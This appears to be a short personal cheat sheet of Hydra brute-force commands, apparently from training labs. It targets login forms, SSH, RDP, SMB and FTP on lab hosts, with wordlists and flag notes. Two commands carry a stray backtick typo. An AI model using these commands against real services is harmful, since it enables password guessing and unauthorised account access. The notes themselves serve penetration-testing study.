# HTTP FORM
```
hyd`ra -L user -P pass ignition.htb http-post-form "/admin:username=^USER^&password=^PASS^:F=incorrect"
```
# HTTPS ONLY PASSWORD
```
hyd`ra -l none -P rockyou.txt 10.129.147.216 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 64 -V
```


# SSH
```
hydra -L user.list -P password.list ssh://10.129.42.197
```
# RDP
```
hydra -L user.list -P password.list rdp://10.129.42.197
```
# SMB
```
hydra -L user.list -P password.list smb://10.129.42.197
```
# ftp
```
hydra -l simon -P pw.txt -s 2121 ftp://10.129.201.127
hydra -v -L user.lst -P word.lst -e nsr fileserver.snakeoil.net ftp
```






# FLAGS
#NULL PASSWORD
-e n

#LOGIN AS PASS
-e s

#REVERSED LOGIN
-e r

#LOGIN NAMES FROM FILE
-L

#LOAD PW FILE
-P

#THREADS
-t

#SHOW EACH LOGIN + PW
-v

-C          LIST FORMAT = USERNAME:PASSWORD
